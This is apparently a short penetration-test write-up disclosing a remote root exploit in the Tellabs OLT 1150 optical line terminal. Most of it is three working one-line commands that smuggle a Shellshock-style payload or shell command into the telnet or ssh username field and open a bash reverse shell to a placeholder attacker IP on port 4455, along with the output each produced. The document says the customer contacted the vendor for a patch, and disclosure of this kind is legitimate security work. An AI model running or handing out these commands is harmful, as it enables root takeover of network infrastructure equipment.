# tellabs_rce
Tellabs OLT RCE

During a recent penetration test, a vulnerability in the way Tellabs handles incoming authentication/authorization was discovered which allowed us to bypass the authentication methods on the Tellabs OLT 1150 device. It is highly suspected that this vulnerability exists in other devices as well.

Steps to reproduce were rather simple, and based on the older Telnet "ShellShock" vulnerability.

It's known that the following methods all produced a netcat reverse shell as root:
Steps used to exploit:

telnet [OLTHOSTNAME] -l ";EOF() { :;}; /usr/bin/id & /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
	The above command asked for the username within the telnet session, and when it timed out, produced the output: "uid=0(emsuser) gid=0(root)" showing that the second portion of the command was not parsed, and the system was vulnerable.

telnet [OLTHOSTNAME] -l "() { :;}; $((/bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1)) /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
	The above command was run and produced a reverse 'netcat' style shell to the attacker IP address with a full root bash shell. Again, suspect the second portion of the command was unnecessary, but due to time constratints, was unable to test further.


ssh [OLTHOSTNAME] -l "''; /bin/bash -i >& /dev/tcp/[attacker_ip]/4455 0>&1"
	After 3 failed authentication attempts the connect back to the netcat listener occurs and you are dropped in a root shell. (Contributed by Sandia National Labratory)


Due to customer concerns with the critical nature of the networking infrastructure, further testing beyond the above was not possible, and the customer immediately contacted the vendor to work on a patch.
